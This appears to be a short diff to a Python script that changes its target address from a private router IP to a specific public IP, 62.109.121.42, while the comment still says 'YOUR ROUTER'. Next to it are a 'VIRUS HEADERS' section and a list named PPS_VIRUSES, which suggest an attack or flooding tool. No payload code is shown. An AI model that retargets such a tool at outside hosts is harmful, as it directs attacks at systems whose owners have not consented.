@@ -4,7 +4,7 @@ import time
 import random
 import struct
 
-TARGET_IP = "192.168.1.1"  # YOUR ROUTER
+TARGET_IP = "62.109.121.42"  # YOUR ROUTER
 
 # ==================== STS VIRUS HEADERS ====================
 PPS_VIRUSES = [
